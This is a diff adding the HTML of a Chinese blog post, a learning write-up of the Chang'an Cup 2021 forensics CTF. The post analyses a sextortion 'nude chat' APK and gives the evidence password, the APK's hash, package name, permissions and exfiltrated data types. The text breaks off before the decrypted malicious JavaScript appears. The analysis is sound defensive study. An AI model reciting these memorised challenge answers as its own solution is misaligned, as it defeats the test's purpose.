@@ -1,0 +1,847 @@
+
+
+<!DOCTYPE html>
+<html lang="zh-CN" data-default-color-scheme=auto>
+
+
+
+<head>
+  <meta charset="UTF-8">
+
+  <link rel="apple-touch-icon" sizes="76x76" href="/img/2.jpg">
+  <link rel="icon" href="/img/2.jpg">
+  
+
+  <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=5.0, shrink-to-fit=no">
+  <meta http-equiv="x-ua-compatible" content="ie=edge">
+  
+  <meta name="theme-color" content="#2f4154">
+  <meta name="author" content="Ramoor">
+  <meta name="keywords" content="">
+  
+    <meta name="description" content="题目题目描述2021年4月25日，上午8点左右，警方接到被害人金某报案，声称自己被敲诈数万元；经询问，昨日金某被嫌疑人诱导裸聊，下载了某“裸聊”软件，导致自己的通讯录和裸聊视频被嫌疑人获取，对其进行敲诈，最终金某不堪重负，选择了报警；警方从金某提供的本人手机中，定向采集到了该“裸聊”软件的安装包–zhibo.apk（检材一），请各位回答下列问题：（题目 中需要通过分析出来的答案对检材二三四五解压，">
+<meta property="og:type" content="article">
+<meta property="og:title" content="电子取证-长安杯2021 学习记录">
+<meta property="og:url" content="http://ramoor.github.io/2025/05/03/%E7%94%B5%E5%AD%90%E5%8F%96%E8%AF%81-%E9%95%BF%E5%AE%89%E6%9D%AF2021%20%E5%AD%A6%E4%B9%A0%E8%AE%B0%E5%BD%95/index.html">
+<meta property="og:site_name" content="Ramoor">
+<meta property="og:description" content="题目题目描述2021年4月25日，上午8点左右，警方接到被害人金某报案，声称自己被敲诈数万元；经询问，昨日金某被嫌疑人诱导裸聊，下载了某“裸聊”软件，导致自己的通讯录和裸聊视频被嫌疑人获取，对其进行敲诈，最终金某不堪重负，选择了报警；警方从金某提供的本人手机中，定向采集到了该“裸聊”软件的安装包–zhibo.apk（检材一），请各位回答下列问题：（题目 中需要通过分析出来的答案对检材二三四五解压，">
+<meta property="og:locale" content="zh_CN">
+<meta property="og:image" content="http://ramoor.github.io/2025/05/03/%E7%94%B5%E5%AD%90%E5%8F%96%E8%AF%81-%E9%95%BF%E5%AE%89%E6%9D%AF2021%20%E5%AD%A6%E4%B9%A0%E8%AE%B0%E5%BD%95/file-20250503213953574.png">
+<meta property="og:image" content="http://ramoor.github.io/2025/05/03/%E7%94%B5%E5%AD%90%E5%8F%96%E8%AF%81-%E9%95%BF%E5%AE%89%E6%9D%AF2021%20%E5%AD%A6%E4%B9%A0%E8%AE%B0%E5%BD%95/file-20250503215110738.png">
+<meta property="og:image" content="http://ramoor.github.io/2025/05/03/%E7%94%B5%E5%AD%90%E5%8F%96%E8%AF%81-%E9%95%BF%E5%AE%89%E6%9D%AF2021%20%E5%AD%A6%E4%B9%A0%E8%AE%B0%E5%BD%95/file-20250503215236584.png">
+<meta property="og:image" content="http://ramoor.github.io/2025/05/03/%E7%94%B5%E5%AD%90%E5%8F%96%E8%AF%81-%E9%95%BF%E5%AE%89%E6%9D%AF2021%20%E5%AD%A6%E4%B9%A0%E8%AE%B0%E5%BD%95/file-20250503222512974.png">
+<meta property="og:image" content="http://ramoor.github.io/2025/05/03/%E7%94%B5%E5%AD%90%E5%8F%96%E8%AF%81-%E9%95%BF%E5%AE%89%E6%9D%AF2021%20%E5%AD%A6%E4%B9%A0%E8%AE%B0%E5%BD%95/file-20250503234602651.png">
+<meta property="og:image" content="http://ramoor.github.io/2025/05/03/%E7%94%B5%E5%AD%90%E5%8F%96%E8%AF%81-%E9%95%BF%E5%AE%89%E6%9D%AF2021%20%E5%AD%A6%E4%B9%A0%E8%AE%B0%E5%BD%95/%7B9F186FA0-58B4-42EC-BF6B-4EA0FE0B68B3%7D.png">
+<meta property="og:image" content="http://ramoor.github.io/2025/05/03/%E7%94%B5%E5%AD%90%E5%8F%96%E8%AF%81-%E9%95%BF%E5%AE%89%E6%9D%AF2021%20%E5%AD%A6%E4%B9%A0%E8%AE%B0%E5%BD%95/file-20250504170920520.png">
+<meta property="og:image" content="http://ramoor.github.io/2025/05/03/%E7%94%B5%E5%AD%90%E5%8F%96%E8%AF%81-%E9%95%BF%E5%AE%89%E6%9D%AF2021%20%E5%AD%A6%E4%B9%A0%E8%AE%B0%E5%BD%95/file-20250504171506835.png">
+<meta property="og:image" content="http://ramoor.github.io/2025/05/03/%E7%94%B5%E5%AD%90%E5%8F%96%E8%AF%81-%E9%95%BF%E5%AE%89%E6%9D%AF2021%20%E5%AD%A6%E4%B9%A0%E8%AE%B0%E5%BD%95/file-20250504202320966.png">
+<meta property="og:image" content="http://ramoor.github.io/2025/05/03/%E7%94%B5%E5%AD%90%E5%8F%96%E8%AF%81-%E9%95%BF%E5%AE%89%E6%9D%AF2021%20%E5%AD%A6%E4%B9%A0%E8%AE%B0%E5%BD%95/file-20250504211832566.png">
+<meta property="og:image" content="http://ramoor.github.io/2025/05/03/%E7%94%B5%E5%AD%90%E5%8F%96%E8%AF%81-%E9%95%BF%E5%AE%89%E6%9D%AF2021%20%E5%AD%A6%E4%B9%A0%E8%AE%B0%E5%BD%95/file-20250504223019653.png">
+<meta property="article:published_time" content="2025-05-03T13:01:09.000Z">
+<meta property="article:modified_time" content="2025-05-06T02:07:00.769Z">
+<meta property="article:author" content="Ramoor">
+<meta property="article:tag" content="CTF">
+<meta property="article:tag" content="Forensics">
+<meta name="twitter:card" content="summary_large_image">
+<meta name="twitter:image" content="http://ramoor.github.io/2025/05/03/%E7%94%B5%E5%AD%90%E5%8F%96%E8%AF%81-%E9%95%BF%E5%AE%89%E6%9D%AF2021%20%E5%AD%A6%E4%B9%A0%E8%AE%B0%E5%BD%95/file-20250503213953574.png">
+  
+  
+  
+  <title>电子取证-长安杯2021 学习记录 - Ramoor</title>
+
+  <link  rel="stylesheet" href="https://lib.baomitu.com/twitter-bootstrap/4.6.1/css/bootstrap.min.css" />
+
+
+
+  <link  rel="stylesheet" href="https://lib.baomitu.com/github-markdown-css/4.0.0/github-markdown.min.css" />
+
+  <link  rel="stylesheet" href="https://lib.baomitu.com/hint.css/2.7.0/hint.min.css" />
+
+  <link  rel="stylesheet" href="https://lib.baomitu.com/fancybox/3.5.7/jquery.fancybox.min.css" />
+
+
+
+<!-- 主题依赖的图标库，不要自行修改 -->
+<!-- Do not modify the link that theme dependent icons -->
+
+<link rel="stylesheet" href="//at.alicdn.com/t/c/font_1749284_5i9bdhy70f8.css">
+
+
+
+<link rel="stylesheet" href="//at.alicdn.com/t/c/font_1736178_k526ubmyhba.css">
+
+
+<link  rel="stylesheet" href="/css/main.css" />
+
+
+  <link id="highlight-css" rel="stylesheet" href="/css/highlight.css" />
+  
+    <link id="highlight-css-dark" rel="stylesheet" href="/css/highlight-dark.css" />
+  
+
+
+
+  
+<link rel="stylesheet" href="//cdn.jsdelivr.net/gh/EmoryHuang/BlogBeautify@1.1/shubiao.css">
+<link rel="stylesheet" href="//cdn.jsdelivr.net/gh/EmoryHuang/BlogBeautify@1.1/scroll.css">
+
+
+
+  <script id="fluid-configs">
+    var Fluid = window.Fluid || {};
+    Fluid.ctx = Object.assign({}, Fluid.ctx)
+    var CONFIG = {"hostname":"ramoor.github.io","root":"/","version":"1.9.8","typing":{"enable":true,"typeSpeed":70,"cursorChar":"_","loop":false,"scope":[]},"anchorjs":{"enable":true,"element":"h1,h2,h3,h4,h5,h6","placement":"left","visible":"hover","icon":""},"progressbar":{"enable":true,"height_px":3,"color":"#29d","options":{"showSpinner":false,"trickleSpeed":100}},"code_language":{"enable":true},"copy_btn":true,"image_caption":{"enable":true},"image_zoom":{"enable":true,"img_url_replace":["",""]},"toc":{"enable":true,"placement":"right","headingSelector":"h1,h2,h3,h4,h5,h6","collapseDepth":0},"lazyload":{"enable":true,"loading_img":"/img/loading.gif","onlypost":false,"offset_factor":2},"web_analytics":{"enable":true,"follow_dnt":true,"baidu":null,"google":{"measurement_id":null},"tencent":{"sid":null,"cid":null},"leancloud":{"app_id":"lPTos9qTFk57xeK53vE7I61e-MdYXbMMI","app_key":"DpXRDnV0ErOnqjSiWrfRvGWm","server_url":null,"path":"window.location.pathname","ignore_local":false},"umami":{"src":null,"website_id":null,"domains":null,"start_time":"2024-01-01T00:00:00.000Z","token":null,"api_server":null}},"search_path":"/local-search.xml","include_content_in_search":true};
+
+    if (CONFIG.web_analytics.follow_dnt) {
+      var dntVal = navigator.doNotTrack || window.doNotTrack || navigator.msDoNotTrack;
+      Fluid.ctx.dnt = dntVal && (dntVal.startsWith('1') || dntVal.startsWith('yes') || dntVal.startsWith('on'));
+    }
+  </script>
+  <script  src="/js/utils.js" ></script>
+  <script  src="/js/color-schema.js" ></script>
+  
+
+  
+
+  
+
+  
+
+  
+
+  
+    
+  
+
+
+
+  
+<!-- hexo injector head_end start -->
+<link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/katex@0.12.0/dist/katex.min.css">
+
+<link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/hexo-math@4.0.0/dist/style.css">
+<!-- hexo injector head_end end --><meta name="generator" content="Hexo 7.3.0"></head>
+
+
+<body>
+  
+
+  <header>
+    
+
+<div class="header-inner" style="height: 70vh;">
+  <nav id="navbar" class="navbar fixed-top  navbar-expand-lg navbar-dark scrolling-navbar">
+  <div class="container">
+    <a class="navbar-brand" href="/">
+      <strong>Ramoor</strong>
+    </a>
+
+    <button id="navbar-toggler-btn" class="navbar-toggler" type="button" data-toggle="collapse"
+            data-target="#navbarSupportedContent"
+            aria-controls="navbarSupportedContent" aria-expanded="false" aria-label="Toggle navigation">
+      <div class="animated-icon"><span></span><span></span><span></span></div>
+    </button>
+
+    <!-- Collapsible content -->
+    <div class="collapse navbar-collapse" id="navbarSupportedContent">
+      <ul class="navbar-nav ml-auto text-center">
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/" target="_self">
+                <i class="iconfont icon-home-fill"></i>
+                <span>首页</span>
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/archives/" target="_self">
+                <i class="iconfont icon-archive-fill"></i>
+                <span>归档</span>
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/categories/" target="_self">
+                <i class="iconfont icon-category-fill"></i>
+                <span>分类</span>
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/tags/" target="_self">
+                <i class="iconfont icon-tags-fill"></i>
+                <span>标签</span>
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/about/" target="_self">
+                <i class="iconfont icon-user-fill"></i>
+                <span>关于</span>
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/links/" target="_self">
+                <i class="iconfont icon-link-fill"></i>
+                <span>友链</span>
+              </a>
+            </li>
+          
+        
+        
+          <li class="nav-item" id="search-btn">
+            <a class="nav-link" target="_self" href="javascript:;" data-toggle="modal" data-target="#modalSearch" aria-label="Search">
+              <i class="iconfont icon-search"></i>
+            </a>
+          </li>
+          
+        
+        
+          <li class="nav-item" id="color-toggle-btn">
+            <a class="nav-link" target="_self" href="javascript:;" aria-label="Color Toggle">
+              <i class="iconfont icon-dark" id="color-toggle-icon"></i>
+            </a>
+          </li>
+        
+      </ul>
+    </div>
+  </div>
+</nav>
+
+  
+
+<div id="banner" class="banner" parallax=true
+     style="background: url('/img/6.jpg') no-repeat center center; background-size: cover;">
+  <div class="full-bg-img">
+    <div class="mask flex-center" style="background-color: rgba(0, 0, 0, 0.3)">
+      <div class="banner-text text-center fade-in-up">
+        <div class="h2">
+          
+            <span id="subtitle" data-typed-text="电子取证-长安杯2021 学习记录"></span>
+          
+        </div>
+
+        
+          
+  <div class="mt-3">
+    
+    
+      <span class="post-meta">
+        <i class="iconfont icon-date-fill" aria-hidden="true"></i>
+        <time datetime="2025-05-03 21:01" pubdate>
+          2025年5月3日 晚上
+        </time>
+      </span>
+    
+  </div>
+
+  <div class="mt-1">
+    
+      <span class="post-meta mr-2">
+        <i class="iconfont icon-chart"></i>
+        
+          3.3k 字
+        
+      </span>
+    
+
+    
+      <span class="post-meta mr-2">
+        <i class="iconfont icon-clock-fill"></i>
+        
+        
+        
+          28 分钟
+        
+      </span>
+    
+
+    
+    
+      
+        <span id="leancloud-page-views-container" class="post-meta" style="display: none">
+          <i class="iconfont icon-eye" aria-hidden="true"></i>
+          <span id="leancloud-page-views"></span>次
+        </span>
+        
+      
+      
+    
+  </div>
+
+
+        
+      </div>
+
+      
+    </div>
+  </div>
+</div>
+
+</div>
+  </header>
+
+  <main>
+    
+      
+
+<div class="container-fluid nopadding-x">
+  <div class="row nomargin-x">
+    <div class="side-col d-none d-lg-block col-lg-2">
+      
+
+    </div>
+
+    <div class="col-lg-8 nopadding-x-md">
+      <div class="container nopadding-x-md" id="board-ctn">
+        <div id="board">
+          <article class="post-content mx-auto">
+            <h1 id="seo-header">电子取证-长安杯2021 学习记录</h1>
+            
+            
+              <div class="markdown-body">
+                
+                <h2 id="题目"><a href="#题目" class="headerlink" title="题目"></a>题目</h2><h3 id="题目描述"><a href="#题目描述" class="headerlink" title="题目描述"></a>题目描述</h3><p>2021年4月25日，上午8点左右，警方接到被害人金某报案，声称自己被敲诈数万元；经询问，昨日金某被嫌疑人诱导裸聊，下载了某“裸聊”软件，导致自己的通讯录和裸聊视频被嫌疑人获取，对其进行敲诈，最终金某不堪重负，选择了报警；警方从金某提供的本人手机中，定向采集到了该“裸聊”软件的安装包–zhibo.apk（检材一），请各位回答下列问题：（题目 中需要通过分析出来的答案对检材二三四五解压，解压密码为IP的情况，需要在密码后增加-CAB2021，例192.168.110.110-CAB2021）</p>
+<h2 id="检材"><a href="#检材" class="headerlink" title="检材"></a>检材</h2><p><img src="/2025/05/03/%E7%94%B5%E5%AD%90%E5%8F%96%E8%AF%81-%E9%95%BF%E5%AE%89%E6%9D%AF2021%20%E5%AD%A6%E4%B9%A0%E8%AE%B0%E5%BD%95/file-20250503213953574.png" srcset="/img/loading.gif" lazyload><br>使用VeraCrypt挂载，挂载密码为</p>
+<figure class="highlight basic"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs basic"><span class="hljs-number">2021</span>第三届CAB-changancup.<span class="hljs-keyword">com</span><br></code></pre></td></tr></table></figure>
+
+<h2 id="第一题"><a href="#第一题" class="headerlink" title="第一题"></a>第一题</h2><h3 id="请计算检材一Apk的SHA256值"><a href="#请计算检材一Apk的SHA256值" class="headerlink" title="请计算检材一Apk的SHA256值"></a>请计算检材一Apk的SHA256值</h3><p>使用HashCalc计算<code>检材一-zhibo.apk</code>的SHA256的hash值<br><img src="/2025/05/03/%E7%94%B5%E5%AD%90%E5%8F%96%E8%AF%81-%E9%95%BF%E5%AE%89%E6%9D%AF2021%20%E5%AD%A6%E4%B9%A0%E8%AE%B0%E5%BD%95/file-20250503215110738.png" srcset="/img/loading.gif" lazyload></p>
+<figure class="highlight llvm"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs llvm"><span class="hljs-number">3</span>fece<span class="hljs-number">1e93</span>be<span class="hljs-number">4</span>f<span class="hljs-number">422</span><span class="hljs-keyword">c</span><span class="hljs-number">8446</span>b<span class="hljs-number">77</span>b<span class="hljs-number">6863</span>eb<span class="hljs-number">6</span>a<span class="hljs-number">39</span>f<span class="hljs-number">19</span>d<span class="hljs-number">8</span>fa<span class="hljs-number">71</span>ff<span class="hljs-number">0250</span>aac<span class="hljs-number">10</span>f<span class="hljs-number">8</span>bdde<span class="hljs-number">73</span>a<br></code></pre></td></tr></table></figure>
+
+<h2 id="第二题"><a href="#第二题" class="headerlink" title="第二题"></a>第二题</h2><h3 id="该APK的应用包名为"><a href="#该APK的应用包名为" class="headerlink" title="该APK的应用包名为"></a>该APK的应用包名为</h3><p>使用jadx反编译，查看<code>AndroidManifest.xml</code>中的<code>package</code>便是应用包名<code>plus.H5B8E45D3</code><br><img src="/2025/05/03/%E7%94%B5%E5%AD%90%E5%8F%96%E8%AF%81-%E9%95%BF%E5%AE%89%E6%9D%AF2021%20%E5%AD%A6%E4%B9%A0%E8%AE%B0%E5%BD%95/file-20250503215236584.png" srcset="/img/loading.gif" lazyload></p>
+<h2 id="第三题"><a href="#第三题" class="headerlink" title="第三题"></a>第三题</h2><h3 id="该APK程序在封装服务商的应用唯一标识（APPID）为"><a href="#该APK程序在封装服务商的应用唯一标识（APPID）为" class="headerlink" title="该APK程序在封装服务商的应用唯一标识（APPID）为"></a>该APK程序在封装服务商的应用唯一标识（APPID）为</h3><p>在<code>assets</code>文件夹下的<code>apps</code>中可以找到appid：<br><img src="/2025/05/03/%E7%94%B5%E5%AD%90%E5%8F%96%E8%AF%81-%E9%95%BF%E5%AE%89%E6%9D%AF2021%20%E5%AD%A6%E4%B9%A0%E8%AE%B0%E5%BD%95/file-20250503222512974.png" srcset="/img/loading.gif" lazyload></p>
+<h2 id="第四题"><a href="#第四题" class="headerlink" title="第四题"></a>第四题</h2><h3 id="该APK具备下列哪些危险权限-多选题-："><a href="#该APK具备下列哪些危险权限-多选题-：" class="headerlink" title="该APK具备下列哪些危险权限(多选题)："></a>该APK具备下列哪些危险权限(多选题)：</h3><figure class="highlight mathematica"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs mathematica"><span class="hljs-variable">A</span><span class="hljs-operator">.</span>读取短信  <br><span class="hljs-variable">B</span><span class="hljs-operator">.</span>读取通讯录  <br><span class="hljs-built_in">C</span><span class="hljs-operator">.</span>读取精确位置  <br><span class="hljs-built_in">D</span><span class="hljs-operator">.</span>修改通讯录  <br><span class="hljs-built_in">E</span><span class="hljs-operator">.</span>修改短信  <br></code></pre></td></tr></table></figure>
+<p>各种权限：[chluo1997.github.io]</p>
+<table>
+<thead>
+<tr>
+<th>读取短信内容</th>
+<th>android.permission.READ_SMS，读取短信内容</th>
+</tr>
+</thead>
+<tbody><tr>
+<td>读取联系人</td>
+<td>android.permission.READ_CONTACTS，允许应用访问联系人通讯录信息</td>
+</tr>
+<tr>
+<td>获取精确位置</td>
+<td>android.permission.ACCESS_FINE_LOCATION，通过GPS芯片接收卫星的定位信息，定位精度达10米以内</td>
+</tr>
+<tr>
+<td>写入联系人</td>
+<td>android.permission.WRITE_CONTACTS，写入联系人，但不可读取</td>
+</tr>
+<tr>
+<td>编写短信</td>
+<td>android.permission.WRITE_SMS，允许编写短信</td>
+</tr>
+<tr>
+<td><img src="/2025/05/03/%E7%94%B5%E5%AD%90%E5%8F%96%E8%AF%81-%E9%95%BF%E5%AE%89%E6%9D%AF2021%20%E5%AD%A6%E4%B9%A0%E8%AE%B0%E5%BD%95/file-20250503234602651.png" srcset="/img/loading.gif" lazyload></td>
+<td></td>
+</tr>
+<tr>
+<td>因此选<code>ABCDE</code></td>
+<td></td>
+</tr>
+</tbody></table>
+<h2 id="第五题"><a href="#第五题" class="headerlink" title="第五题"></a>第五题</h2><h3 id="该APK发送回后台服务器的数据包含一下哪些内容-多选题-："><a href="#该APK发送回后台服务器的数据包含一下哪些内容-多选题-：" class="headerlink" title="该APK发送回后台服务器的数据包含一下哪些内容(多选题)："></a>该APK发送回后台服务器的数据包含一下哪些内容(多选题)：</h3><figure class="highlight mathematica"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs mathematica"><span class="hljs-variable">A</span><span class="hljs-operator">.</span>手机通讯录  <br><span class="hljs-variable">B</span><span class="hljs-operator">.</span>手机应用列表  <br><span class="hljs-built_in">C</span><span class="hljs-operator">.</span>手机号码  <br><span class="hljs-built_in">D</span><span class="hljs-operator">.</span>验证码  <br><span class="hljs-built_in">E</span><span class="hljs-operator">.</span><span class="hljs-variable">GPS</span>定位信息<br></code></pre></td></tr></table></figure>
+
+<p><img src="/2025/05/03/%E7%94%B5%E5%AD%90%E5%8F%96%E8%AF%81-%E9%95%BF%E5%AE%89%E6%9D%AF2021%20%E5%AD%A6%E4%B9%A0%E8%AE%B0%E5%BD%95/%7B9F186FA0-58B4-42EC-BF6B-4EA0FE0B68B3%7D.png" srcset="/img/loading.gif" lazyload><img src="/2025/05/03/%E7%94%B5%E5%AD%90%E5%8F%96%E8%AF%81-%E9%95%BF%E5%AE%89%E6%9D%AF2021%20%E5%AD%A6%E4%B9%A0%E8%AE%B0%E5%BD%95/file-20250504170920520.png" srcset="/img/loading.gif" lazyload><br>发现可疑代码：<br><img src="/2025/05/03/%E7%94%B5%E5%AD%90%E5%8F%96%E8%AF%81-%E9%95%BF%E5%AE%89%E6%9D%AF2021%20%E5%AD%A6%E4%B9%A0%E8%AE%B0%E5%BD%95/file-20250504171506835.png" srcset="/img/loading.gif" lazyload><br><code>sojson.v4</code>解密得到：</p>
+<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br><span class="line">175</span><br><span class="line">176</span><br><span class="line">177</span><br><span class="line">178</span><br><span class="line">179</span><br><span class="line">180</span><br><span class="line">181</span><br><span class="line">182</span><br><span class="line">183</span><br><span class="line">184</span><br><span class="line">185</span><br><span class="line">186</span><br><span class="line">187</span><br><span class="line">188</span><br><span class="line">189</span><br><span class="line">190</span><br><span class="line">191</span><br><span class="line">192</span><br><span class="line">193</span><br><span class="line">194</span><br><span class="line">195</span><br><span class="line">196</span><br><span class="line">197</span><br><span class="line">198</span><br><span class="line">199</span><br><span class="line">200</span><br><span class="line">201</span><br><span class="line">202</span><br><span class="line">203</span><br><span class="line">204</span><br><span class="line">205</span><br><span class="line">206</span><br><span class="line">207</span><br><span class="line">208</span><br><span class="line">209</span><br><span class="line">210</span><br><span class="line">211</span><br><span class="line">212</span><br><span class="line">213</span><br><span class="line">214</span><br><span class="line">215</span><br><span class="line">216</span><br><span class="line">217</span><br><span class="line">218</span><br><span class="line">219</span><br><span class="line">220</span><br><span class="line">221</span><br><span class="line">222</span><br><span class="line">223</span><br><span class="line">224</span><br><span class="line">225</span><br><span class="line">226</span><br><span class="line">227</span><br><span class="line">228</span><br><span class="line">229</span><br><span class="line">230</span><br><span class="line">231</span><br><span class="line">232</span><br><span class="line">233</span><br><span class="line">234</span><br><span class="line">235</span><br><span class="line">236</span><br><span class="line">237</span><br><span class="line">238</span><br><span class="line">239</span><br><span class="line">240</span><br><span class="line">241</span><br><span class="line">242</span><br><span class="line">243</span><br><span class="line">244</span><br><span class="line">245</span><br><span class="line">246</span><br><span class="line">247</span><br><span class="line">248</span><br><span class="line">249</span><br><span class="line">250</span><br><span class="line">251</span><br><span class="line">252</span><br><span class="line">253</span><br><span class="line">254</span><br><span class="line">255</span><br><span class="line">256</span><br><span class="line">257</span><br><span class="line">258</span><br><span class="line">259</span><br><span class="line">260</span><br><span class="line">261</span><br><span class="line">262</span><br><span class="line">263</span><br><span class="line">264</span><br><span class="line">265</span><br><span class="line">266</span><br><span class="line">267</span><br><span class="line">268</span><br><span class="line">269</span><br><span class="line">270</span><br><span class="line">271</span><br><span class="line">272</span><br><span class="line">273</span><br><span class="line">274</span><br><span class="line">275</span><br><span class="line">276</span><br><span class="line">277</span><br><span class="line">278</span><br><span class="line">279</span><br><span class="line">280</span><br><span class="line">281</span><br><span class="line">282</span><br><span class="line">283</span><br><span class="line">284</span><br><span class="line">285</span><br><span class="line">286</span><br><span class="line">287</span><br><span class="line">288</span><br><span class="line">289</span><br><span class="line">290</span><br><span class="line">291</span><br><span class="line">292</span><br><span class="line">293</span><br><span class="line">294</span><br><span class="line">295</span><br><span class="line">296</span><br><span class="line">297</span><br><span class="line">298</span><br><span class="line">299</span><br><span class="line">300</span><br><span class="line">301</span><br><span class="line">302</span><br><span class="line">303</span><br><span class="line">304</span><br><span class="line">305</span><br><span class="line">306</span><br><span class="line">307</span><br><span class="line">308</span><br><span class="line">309</span><br><span class="line">310</span><br><span class="line">311</span><br><span class="line">312</span><br><span class="line">313</span><br><span class="line">314</span><br><span class="line">315</span><br><span class="line">316</span><br><span class="line">317</span><br><span class="line">318</span><br><span class="line">319</span><br><span class="line">320</span><br><span class="line">321</span><br><span class="line">322</span><br><span class="line">323</span><br><span class="line">324</span><br><span class="line">325</span><br><span class="line">326</span><br><span class="line">327</span><br><span class="line">328</span><br><span class="line">329</span><br><span class="line">330</span><br><span class="line">331</span><br><span class="line">332</span><br><span class="line">333</span><br><span class="line">334</span><br><span class="line">335</span><br><span class="line">336</span><br><span class="line">337</span><br><span class="line">338</span><br><span class="line">339</span><br><span class="line">340</span><br><span class="line">341</span><br><span class="line">342</span><br><span class="line">343</span><br><span class="line">344</span><br><span class="line">345</span><br><span class="line">346</span><br><span class="line">347</span><br><span class="line">348</span><br><span class="line">349</span><br><span class="line">350</span><br><span class="line">351</span><br><span class="line">352</span><br><span class="line">353</span><br><span class="line">354</span><br><span class="line">355</span><br><span class="line">356</span><br><span class="line">357</span><br><span class="line">358</span><br><span class="line">359</span><br><span class="line">360</span><br><span class="line">361</span><br><span class="line">362</span><br><span class="line">363</span><br><span class="line">364</span><br><span class="line">365</span><br><span class="line">366</span><br><span class="line">367</span><br><span class="line">368</span><br><span class="line">369</span><br><span class="line">370</span><br><span class="line">371</span><br><span class="line">372</span><br><span class="line">373</span><br><span class="line">374</span><br><span class="line">375</span><br><span class="line">376</span><br><span class="line">377</span><br><span class="line">378</span><br><span class="line">379</span><br><span class="line">380</span><br><span class="line">381</span><br><span class="line">382</span><br><span class="line">383</span><br><span class="line">384</span><br><span class="line">385</span><br><span class="line">386</span><br><span class="line">387</span><br><span class="line">388</span><br><span class="line">389</span><br><span class="line">390</span><br><span class="line">391</span><br><span class="line">392</span><br><span class="line">393</span><br><span class="line">394</span><br><span class="line">395</span><br><span class="line">396</span><br><span class="line">397</span><br><span 